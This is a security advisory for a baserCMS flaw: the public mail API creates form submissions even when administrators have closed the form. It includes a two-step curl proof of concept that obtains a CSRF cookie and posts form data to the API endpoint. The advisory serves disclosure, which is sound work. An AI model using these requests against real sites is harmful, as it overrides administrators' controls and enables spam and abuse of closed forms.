summary: "baserCMS has Mail Form Acceptance Bypass via Public API\n### Summary\nA public mail\
  \ submission API allows unauthenticated users to submit mail form entries even when the corresponding\
  \ form is not accepting submissions. This bypasses administrative controls intended to stop\
  \ form intake and enables spam or abuse via the API.\n\n### Details\nIn baserCMS, mail form\
  \ submissions through the front-end UI are guarded by acceptance checks implemented in `MailFrontService::isAccepting()`,\
  \ which ensures that the mail form is currently accepting submissions (e.g. within its configured\
  \ publish/acceptance window).\n\nThese checks are enforced in the UI flow handled by `MailController::index()`\
  \ and `MailController::confirm()`  \n(e.g. `plugins/bc-mail/src/Controller/MailController.php`).\n\
  \nHowever, the public API endpoint:\n\n`plugins/bc-mail/src/Controller/Api/MailMessagesController.php::add()`\n\
  \ndoes not invoke `MailFrontService::isAccepting()` and does not verify whether the mail form\
  \ is currently accepting submissions. As a result, the API accepts submissions regardless\
  \ of the form’s acceptance state.\n\nThe endpoint does not require authentication. A valid\
  \ CSRF cookie and token pair is sufficient to create a mail message. This allows submissions\
  \ even when administrators intentionally disable or close the mail form via the admin UI.\n\
  \n### PoC\n1. In the admin UI, configure a mail form so that it is **not accepting submissions**\
  \ (e.g. outside its acceptance period or explicitly closed).\n2. Obtain a CSRF cookie by accessing\
  \ the site root:\n```\ncurl -sS -D - -o - -c /tmp/basercms_cookies.txt 'http://localhost/'\n\
  ```\n3. Extract the CSRF token from the `csrfToken` cookie and submit a POST request to the\
  \ public API endpoint:\n```\ncurl -sS -D - -o - -X POST 'http://localhost/baser/api/bc-mail/mail_messages/add/1.json'\
  \ \n-H 'Content-Type: application/x-www-form-urlencoded' \n-H 'Referer: http://localhost/'\
  \ \n-H 'X-CSRF-Token: <csrf-token-from-cookie>' \n-b /tmp/basercms_cookies.txt \n--data-urlencode\
  \ 'name_1=Test' \n--data-urlencode 'name_2=User' \n--data-urlencode 'email_1=test@example.com'\
  \ \n--data-urlencode 'email_2=test@example.com' \n--data-urlencode 'category[]=資料請求' \n--data-urlencode\
  \ 'root=検索エンジン' \n--data-urlencode 'message=API bypass test'\n```\n4. The server responds\
  \ with `200 OK` and creates a mail message, even though the form is configured to reject submissions.\n\
  \n### Impact\nThis is an access control / business logic bypass vulnerability.\n\nAdministrators\
  \ rely on the mail form acceptance settings to temporarily or permanently stop form intake\
  \ (e.g. during maintenance, incidents, or spam attacks). This vulnerability allows attackers\
  \ to bypass those controls via the public API, enabling unauthorized mail submissions, spam,\
  \ and operational disruption."
